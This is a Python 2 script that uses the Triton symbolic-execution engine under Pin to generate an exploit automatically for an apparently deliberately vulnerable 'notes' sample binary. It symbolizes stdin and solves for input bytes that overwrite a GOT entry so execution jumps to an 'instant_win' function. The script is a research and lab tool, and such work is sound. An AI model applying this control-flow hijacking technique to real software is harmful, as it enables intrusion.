#!/usr/bin/env python2
## -*- coding: utf-8 -*-

_ = """
time ~/project/pin-2.14-71313-gcc.4.4.7-linux/source/tools/Triton/build/triton solve-notes-phase-2.py vuln-samples/notes < crash_inputs
"""

import os
from triton  import *
from pintool import *
import time

isRead = None
Triton = getTritonContext()
crash_inputs = []
found = False

instant_win = 0x4008b2

def solve():
    global Triton
    global crash_inputs
    global found

    found = False
    inputs = ['\0'] * 1024
    astCtxt = Triton.getAstContext()

    try:
        m = Triton.getModel(
                # astCtxt.equal(astCtxt.variable(Triton.getSymbolicVariableFromId(0)), astCtxt.bv(0x4008b2, CPUSIZE.QWORD_BIT)), # instant_win() = 0x4008b2
                astCtxt.equal(Triton.buildSymbolicMemory(MemoryAccess(0x602060 + 3 * 8, CPUSIZE.QWORD)), astCtxt.bv(instant_win, CPUSIZE.QWORD_BIT)), # instant_win() = 0x4008b2
            )
        if len(m) > 0:
            found = True
            with open('crash_inputs') as f:
                crash_inputs = list(f.read())
            print '[TT] Model for Memory Access:', m
            for k, v in m.items():
                inputs[k] = chr(v.getValue())
                crash_inputs[k] = chr(v.getValue())
                Triton.setConcreteSymbolicVariableValue(Triton.getSymbolicVariableFromId(k), v.getValue()) # update concate memory
            print crash_inputs
            print 'Crash Inputs: %r' % ''.join(crash_inputs)
            with open('crash_inputs-2', 'wb') as f:
                f.write(''.join(crash_inputs))
            print '[TT] Automated Exploit Generation Done.'
            exit()
        else:
            print '[TT] Model for Memory Access: unsat'

        if found:
            return True
        return False
    except Exception, e:
        print "Exception: ", e
        exit()


def getMemoryString(addr):
    index = 0
    s = str()

    while getCurrentMemoryValue(addr+index):
        c = chr(getCurrentMemoryValue(addr+index))
        s += ("" if c not in string.printable else c)
        index += 1

    return s


def syscallsEntry(threadId, std):
    global isOpen
    global isRead
    global targetFd

    # print '[TT:debug] syscallsEntry'
    if getSyscallNumber(std) == SYSCALL64.READ:
        fd   = getSyscallArgument(std, 0)
        buff = getSyscallArgument(std, 1)
        size = getSyscallArgument(std, 2)
        if fd == 0:
            isRead = {'buff': buff, 'size': size}

    return

stdin_len = 0
def syscallsExit(threadId, std):
    global isOpen
    global isRead
    global targetFd
    global stdin_len
    global concrete_input_offets

    # print '[TT:debug] syscallsExit'

    ctxt = getTritonContext()

    if isRead is not None:
        size = isRead['size']
        buff = isRead['buff']
        print '\n[TT] Symbolizing stdin (buf=%#x, size=%d)' % (buff, size)
        for index in range(size):
            Triton.taintMemory(buff+index)
            print '\tread: %r (%#x)' % (chr(getCurrentMemoryValue(buff+index)), getCurrentMemoryValue(buff+index))
            crash_inputs.append(chr(getCurrentMemoryValue(buff+index)))
            start_time = time.time()
            ctxt.setConcreteMemoryValue(buff+index, getCurrentMemoryValue(buff+index))
            # if stdin_len >= 30 and stdin_len < 50: ### makes incorrect result
            if True:
                print "Symbolized input: ", ctxt.convertMemoryToSymbolicVariable(MemoryAccess(buff+index, CPUSIZE.BYTE)) ### become slower
            ### concretize part of stdin
            if stdin_len in concrete_input_offets:
                print "\tConcretized stdin pos %d" % stdin_len
                ctxt.concretizeMemory(MemoryAccess(buff+index, CPUSIZE.BYTE))
            end_time = time.time()
            print 'symbolize took %f sec' % (end_time - start_time)
            stdin_len += 1
        isRead = None

    return


def mycb(inst):
    global mc
    global mnode
    global stdin_len
    global found

    if inst.getAddress() == instant_win:
        print '[TT] $PC reached to target address!!'
        if found:
            exit()
    if (inst.getAddress() & 0xfff) == (0x00007ffff7a8c231 & 0xfff):
        if inst.isMemoryWrite() and inst.isSymbolized():
            if stdin_len >= 75:
                found = solve()
                # if found:
                #     print "[TT] End"
                #     exit()
    return

def signals(threadId, sig):
    print 'Signal %d received on thread %d.' % (sig, threadId)
    print '========================== DUMP =========================='
    regs = getTritonContext().getParentRegisters()
    for reg in regs:
        value  = getCurrentRegisterValue(reg)
        exprId = getTritonContext().getSymbolicRegisterId(reg)
        print '%s:\t%#016x\t%s' %(reg.getName(), value, (getTritonContext().getSymbolicExpressionFromId(exprId).getAst() if exprId != SYMEXPR.UNSET else 'UNSET'))
    solve()


if __name__ == '__main__':

    # Define symbolic optimizations
    Triton.enableMode(MODE.ALIGNED_MEMORY, True) ### **REQUIRED** (slowns, but nor leaAst becomes bvtrue)
    Triton.enableMode(MODE.ONLY_ON_SYMBOLIZED, True) ### **REQUIRED**

    startAnalysisFromSymbol('main')

    concrete_input_offets = range(66)

    # print 'Symbolized GOT Table Entry:', Triton.convertMemoryToSymbolicVariable(MemoryAccess(0x602060 + 3 * 8, CPUSIZE.QWORD))

    # Add callback
    insertCall(mycb, INSERT_POINT.BEFORE)
    insertCall(signals, INSERT_POINT.SIGNALS) # wait for SIGSEGV

    insertCall(syscallsEntry, INSERT_POINT.SYSCALL_ENTRY)
    insertCall(syscallsExit,  INSERT_POINT.SYSCALL_EXIT)

    # Run Program
    runProgram()
